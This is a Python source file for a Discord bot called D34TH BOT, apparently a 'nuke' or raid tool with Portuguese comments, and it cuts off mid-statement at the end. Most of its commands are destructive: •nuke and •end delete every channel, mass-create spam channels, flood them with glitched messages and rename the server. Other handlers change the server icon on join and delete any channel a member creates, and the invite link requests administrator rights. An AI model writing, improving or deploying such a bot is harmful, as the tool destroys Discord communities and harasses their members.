import discord
from discord.ext import commands
from discord import ButtonStyle, ui
import asyncio
import os
import sys
import random
import string
from dotenv import load_dotenv
import threading
from flask import Flask
import aiohttp

# Carregar variáveis de ambiente
load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')

if not TOKEN:
    print("TOKEN nao encontrado! Verifique o arquivo .env")
    sys.exit(1)

# Configurar intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='•', intents=intents)

# ========== SERVIDOR HTTP PARA O RENDER ==========
app = Flask('')

@app.route('/')
def home():
    return "D34TH BOT ESTA RODANDO!"

def run_flask():
    app.run(host='0.0.0.0', port=10000)

threading.Thread(target=run_flask, daemon=True).start()
# ================================================

# ========== FUNCOES DE TEXTO ==========
def load_text():
    try:
        with open('texto.txt', 'r', encoding='utf-8') as f:
            return f.read().strip()
    except FileNotFoundError:
        with open('texto.txt', 'w', encoding='utf-8') as f:
            f.write("D34TH TEAM")
        return "D34TH TEAM"
    except Exception as e:
        print(f"Erro ao carregar texto: {e}")
        return "D34TH TEAM"

def update_text(new_text):
    try:
        with open('texto.txt', 'w', encoding='utf-8') as f:
            f.write(new_text)
        return True
    except Exception as e:
        print(f"Erro ao atualizar texto: {e}")
        return False

# ========== FUNCAO DE GLITCH ==========
def glitch_text(texto, intensidade=3):
    """Embaralha caracteres e adiciona caracteres ASCII aleatorios"""
    caracteres_ascii = [
        '¢', '£', '¤', '¥', '¦', '§', '¨', '©', 'ª', '«', '¬', '®', '¯', '°', 
        '±', '²', '³', '´', 'µ', '¶', '·', '¸', '¹', 'º', '»', '¼', '½', '¾', '¿',
        'À', 'Á', 'Â', 'Ã', 'Ä', 'Å', 'Æ', 'Ç', 'È', 'É', 'Ê', 'Ë', 'Ì', 'Í',
        'Î', 'Ï', 'Ð', 'Ñ', 'Ò', 'Ó', 'Ô', 'Õ', 'Ö', '×', 'Ø', 'Ù', 'Ú', 'Û',
        'Ü', 'Ý', 'Þ', 'ß', 'à', 'á', 'â', 'ã', 'ä', 'å', 'æ', 'ç', 'è', 'é',
        'ê', 'ë', 'ì', 'í', 'î', 'ï', 'ð', 'ñ', 'ò', 'ó', 'ô', 'õ', 'ö', '÷',
        'ø', 'ù', 'ú', 'û', 'ü', 'ý', 'þ', 'ÿ'
    ]
    
    texto_lista = list(texto)
    
    # Embaralhar posicoes
    for _ in range(intensidade):
        if len(texto_lista) > 1:
            i = random.randint(0, len(texto_lista)-1)
            j = random.randint(0, len(texto_lista)-1)
            if i != j:
                texto_lista[i], texto_lista[j] = texto_lista[j], texto_lista[i]
    
    # Inserir caracteres ASCII aleatorios
    if len(texto_lista) > 3:
        for _ in range(intensidade):
            pos = random.randint(0, len(texto_lista)-1)
            char = random.choice(caracteres_ascii)
            texto_lista.insert(pos, char)
            if len(texto_lista) > 20:
                break
    
    return ''.join(texto_lista)

async def glitch_message(ctx, mensagem, tempo=10):
    """Envia mensagem e fica embaralhando por X segundos"""
    try:
        msg = await ctx.send(mensagem)
        
        for _ in range(tempo * 2):  # Atualiza 2 vezes por segundo
            texto_glitch = glitch_text(mensagem, random.randint(2, 5))
            await msg.edit(content=texto_glitch)
            await asyncio.sleep(0.5)
            
            # Volta ao original de vez em quando
            if random.random() < 0.1:
                await msg.edit(content=mensagem)
                await asyncio.sleep(0.3)
        
        # Finaliza com a mensagem original
        await msg.edit(content=mensagem)
        
    except Exception as e:
        print(f"Erro no glitch: {e}")

# ========== LINK DO BOT ==========
BOT_INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1543062082227011654&permissions=8&integration_type=1&scope=bot+applications.commands"

# ========== EVENTOS ==========
@bot.event
async def on_ready():
    print(f'Bot logado como {bot.user}')
    print(f'Em {len(bot.guilds)} servidores')
    await bot.change_presence(activity=discord.Game(name="•help_bot | D34TH"))

@bot.event
async def on_guild_join(guild):
    """Quando o bot entra em um servidor novo, muda a foto"""
    try:
        avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                if resp.status == 200:
                    avatar_data = await resp.read()
                    await guild.edit(icon=avatar_data)
                    print(f"Foto do servidor {guild.name} atualizada ao entrar!")
    except Exception as e:
        print(f"Erro ao atualizar foto: {e}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"Comando nao encontrado! Use •help_bot para ver os comandos.", delete_after=5)
    else:
        print(f"Erro: {error}")

# ========== MONITOR DE CANAIS ==========
@bot.event
async def on_guild_channel_create(channel):
    """Apaga qualquer canal criado automaticamente"""
    try:
        await channel.delete()
        print(f"Canal {channel.name} apagado automaticamente!")
    except:
        pass

# ========== CLASSES DOS BOTOES ==========
class InviteButton(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @ui.button(label="COPIAR LINK", style=ButtonStyle.gray, custom_id="copy_invite")
    async def copy_invite(self, interaction: discord.Interaction, button: ui.Button):
        try:
            await interaction.response.send_message(
                f"LINK DO BOT:\n{BOT_INVITE_URL}",
                ephemeral=True
            )
        except Exception as e:
            await interaction.response.send_message(
                f"Erro: {str(e)}",
                ephemeral=True
            )

class SpamButton(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @ui.button(label="ENVIAR MENSAGEM", style=ButtonStyle.gray, custom_id="spam_button")
    async def spam_button(self, interaction: discord.Interaction, button: ui.Button):
        try:
            texto = load_text()
            mensagem = f"{texto}\nD34TH TEAM"
            
            # Envia com efeito glitch
            await interaction.response.send_message("Iniciando glitch...")
            msg = await interaction.original_response()
            
            for _ in range(10):
                texto_glitch = glitch_text(mensagem, random.randint(2, 5))
                await msg.edit(content=texto_glitch)
                await asyncio.sleep(0.4)
            
            await msg.edit(content=mensagem)
            
        except Exception as e:
            await interaction.response.send_message(f"Erro: {str(e)}")

# ========== COMANDOS ==========

@bot.command()
async def invite(ctx):
    """Link de convite do bot com botao para copiar"""
    try:
        await ctx.message.delete()
        embed = discord.Embed(
            title="D34TH BOT",
            description=(
                "Adicione o bot ao seu servidor\n\n"
                "Permissoes: Administrador\n"
                "Comandos: 10+ comandos de destruicao\n"
                "Velocidade: Ultra rapido\n\n"
                "Clique no botao abaixo para copiar o link"
            ),
            color=discord.Color.dark_gray()
        )
        embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
        embed.set_footer(text="D34TH TEAM - O caos esta a um clique")
        
        view = InviteButton()
        await ctx.send(embed=embed, view=view)
        
    except Exception as e:
        await ctx.send(f"Erro: {str(e)}")

@bot.command()
async def button(ctx):
    """Cria um botao que manda a mensagem do bot com glitch"""
    try:
        await ctx.message.delete()
        texto = load_text()
        
        embed = discord.Embed(
            title="D34TH SPAM",
            description=f"Mensagem atual: {texto}\n\nClique no botao abaixo para enviar com glitch",
            color=discord.Color.dark_gray()
        )
        
        view = SpamButton()
        await ctx.send(embed=embed, view=view)
        
    except Exception as e:
        await ctx.send(f"Erro: {str(e)}")

@bot.command()
async def glitch(ctx, *, texto: str = None):
    """Envia mensagem com efeito glitch por 10 segundos"""
    try:
        await ctx.message.delete()
        if texto is None:
            texto = load_text()
        
        await glitch_message(ctx, texto, 10)
        
    except Exception as e:
        await ctx.send(f"Erro: {str(e)}")

@bot.command()
async def update_server_icon(ctx):
    """Atualiza a foto do servidor para a foto do bot"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                if resp.status == 200:
                    avatar_data = await resp.read()
                    await guild.edit(icon=avatar_data)
                    
                    embed = discord.Embed(
                        title="FOTO ATUALIZADA",
                        description="A foto do servidor foi atualizada para a foto do bot",
                        color=discord.Color.dark_gray()
                    )
                    embed.set_thumbnail(url=avatar_url)
                    await ctx.send(embed=embed, delete_after=5)
                else:
                    await ctx.send("Erro ao baixar a foto do bot", delete_after=5)
    except Exception as e:
        await ctx.send(f'Erro: {str(e)}', delete_after=5)

@bot.command()
async def ping(ctx):
    """Verifica a latencia do bot"""
    try:
        latency = round(bot.latency * 1000)
        embed = discord.Embed(
            title="PING",
            description=f"Latencia: {latency}ms",
            color=discord.Color.dark_gray()
        )
        await ctx.send(embed=embed, delete_after=10)
    except Exception as e:
        await ctx.send(f"Erro: {str(e)}")

@bot.command()
async def nuke(ctx):
    """NUKE TOTAL: Cria canais, envia 10 mensagens em cada, renomeia tudo com glitch"""
    try:
        await ctx.message.delete()
        texto = load_text()
        guild = ctx.guild
        
        # Renomear o servidor
        try:
            await guild.edit(name="D34TH TEAM")
        except:
            pass
        
        # Atualizar foto
        try:
            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
            async with aiohttp.ClientSession() as session:
                async with session.get(avatar_url) as resp:
                    if resp.status == 200:
                        avatar_data = await resp.read()
                        await guild.edit(icon=avatar_data)
        except:
            pass
        
        # Apagar TODOS os canais
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                    await channel.delete()
                    await asyncio.sleep(0.05)
            except:
                pass
        
        # Criar canais
        criados = 0
        canais_criados = []
        
        for i in range(50):
            try:
                canal = await guild.create_text_channel(f"d34th-{i+1}")
                canais_criados.append(canal)
                criados += 1
                await asyncio.sleep(0.03)
            except:
                pass
        
        for i in range(20):
            try:
                canal = await guild.create_voice_channel(f"voice-d34th-{i+1}")
                canais_criados.append(canal)
                criados += 1
                await asyncio.sleep(0.03)
            except:
                pass
        
        for i in range(10):
            try:
                canal = await guild.create_forum_channel(f"forum-d34th-{i+1}")
                canais_criados.append(canal)
                criados += 1
                await asyncio.sleep(0.03)
            except:
                pass
        
        # Enviar 10 mensagens em cada canal com glitch
        mensagens_enviadas = 0
        for canal in canais_criados:
            if isinstance(canal, discord.TextChannel):
                try:
                    for i in range(10):
                        mensagem = f"{texto}\nD34TH TEAM\nMensagem {i+1}/10"
                        
                        # Envia com glitch rapido
                        msg = await canal.send(mensagem)
                        for _ in range(5):
                            texto_glitch = glitch_text(mensagem, 3)
                            await msg.edit(content=texto_glitch)
                            await asyncio.sleep(0.2)
                        await msg.edit(content=mensagem)
                        
                        mensagens_enviadas += 1
                        await asyncio.sleep(0.03)
                except:
                    pass
        
        embed = discord.Embed(
            title="NUKE COMPLETO",
            description=(
                f"CANAIS CRIADOS: {criados}\n"
                f"MENSAGENS ENVIADAS: {mensagens_enviadas}\n"
                f"SERVIDOR RENOMEADO"
            ),
            color=discord.Color.dark_gray()
        )
        
        if guild.text_channels:
            await guild.text_channels[0].send(embed=embed)
        
    except Exception as e:
        print(f"Erro no nuke: {e}")

@bot.command()
async def end(ctx):
    """APAGA TODOS OS CANAIS e MONITORA para apagar novos"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        # Atualizar foto
        try:
            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
            async with aiohttp.ClientSession() as session:
                async with session.get(avatar_url) as resp:
                    if resp.status == 200:
                        avatar_data = await resp.read()
                        await guild.edit(icon=avatar_data)
        except:
            pass
        
        # Apagar TODOS os canais
        count = 0
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                    await channel.delete()
                    count += 1
                    await asyncio.sleep(0.05)
            except:
                pass
        
        # Renomear servidor
        try:
            await guild.edit(name="D34TH TEAM")
        except:
            pass
            
        print(f"{count} canais apagados no servidor {guild.name}")
        
        # Tentar enviar mensagem final com glitch
        if guild.text_channels:
            mensagem = f"{count} canais foram apagados"
            await glitch_message(await guild.text_channels[0], mensagem, 5)
        
    except Exception as e:
        print(f"Erro no end: {e}")

@bot.command()
async def rename_all(ctx):
    """Renomeia todos os canais e o servidor"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        contador = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await channel.edit(name="d34th-team")
                    contador += 1
                    await asyncio.sleep(0.1)
                except:
                    pass
        
        # Renomear servidor e atualizar foto
        try:
            await guild.edit(name="D34TH TEAM")
            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
            async with aiohttp.ClientSession() as session:
                async with session.get(avatar_url) as resp:
                    if resp.status == 200:
                        avatar_data = await resp.read()
                        await guild.edit(icon=avatar_data)
        except:
            pass
            
        embed = discord.Embed(
            title="RENOMEADO",
            description=f"{contador} canais renomeados e foto atualizada",
            color=discord.Color.dark_gray()
        )
        await ctx.send(embed=embed, delete_after=5)
        
    except Exception as e:
        await ctx.send(f'Erro: {str(e)}', delete_after=5)

@bot.command()
async def set_text(ctx, *, texto):
    """Atualiza o texto das mensagens"""
    try:
        await ctx.message.delete()
        if update_text(texto):
            embed = discord.Embed(
                title="TEXTO ATUALIZADO",
                description=f"Novo texto: {texto}",
                color=discord.Color.dark_gray()
            )
            await ctx.send(embed=embed, delete_after=5)
        else:
            await ctx.send("Erro ao atualizar texto", delete_after=5)
    except Exception as e:
        await ctx.send(f'Erro: {str(e)}', delete_after=5)

@bot.command()
async def create_channels(ctx, quantidade: int = 10):
    """Cria N canais (padrao: 10)"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        if quantidade > 50:
            quantidade = 50
            await ctx.send("Limitado a 50 canais por vez", delete_after=5)
        
        criados = 0
        for i in range(quantidade):
            try:
                await guild.create_text_channel(f"channel-{i+1}")
                criados += 1
                await asyncio.sleep(0.1)
            except:
                pass
                
        embed = discord.Embed(
            title="CANAIS CRIADOS",
            description=f"{criados} canais criados",
            color=discord.Color.dark_gray()
        )
        await ctx.send(embed=embed, delete_after=5)
        
    except Exception as e:
        await ctx.send(f'Erro: {str(e)}', delete_after=5)

@bot.command()
async def spam(ctx, canal: discord.TextChannel = None, quantidade: int = 10):
    """Spam em um canal especifico com glitch"""
    try:
        await ctx.message.delete()
        target = canal or ctx.channel
        texto = load_text()
        
        for i in range(quantidade):
            mensagem = f"{texto}\nD34TH TEAM\nSpam {i+1}/{quantidade}"
            await glitch_message(target, mensagem, 3)
            await asyncio.sleep(0.05)
            
        await ctx.send(f"{quantidade} mensagens enviadas em {target.mention}", delete_after=5)
    except Exception as e:
        await ctx.send(f'Erro: {str(e)}', delete_after=5)

@bot.command()
async def help_bot(ctx):
    """Mostra todos os comandos"""
    embed = discord.Embed(
        title="D34TH BOT - COMANDOS",
        description="COMANDOS DE DESTRUICAO",
        color=discord.Color.dark_gray()
    )
    embed.add_field(
        name="COMANDOS PRINCIPAIS",
        value=(
            "`•invite` - Link de convite do bot\n"
            "`•button` - Botao de spam com glitch\n"
            "`•glitch <texto>` - Envia texto com glitch\n"
            "`•ping` - Verifica latencia\n"
            "`•nuke` - NUKE TOTAL\n"
            "`•end` - APAGA TUDO\n"
            "`•rename_all` - Renomeia tudo\n"
            "`•set_text <texto>` - Muda a mensagem\n"
            "`•create_channels <qtd>` - Cria canais\n"
            "`•spam <canal> <qtd>` - Spam com glitch\n"
            "`•update_server_icon` - Atualiza foto"
        ),
        inline=False
    )
    embed.add_field(
        name="ESTATISTICAS",
        value=(
            f"SERVIDORES: {len(bot.guilds)}\n"
            f"USUARIOS: {len(bot.users)}\n"
            f"COMANDOS: {len(bot.commands)}"
        ),
        inline=True
    )
    embed.add_field(
        name="LINK",
        value=f"[Adicionar bot]({BOT_INVITE_URL})",
        inline=True
    )
    embed.add_field(
   
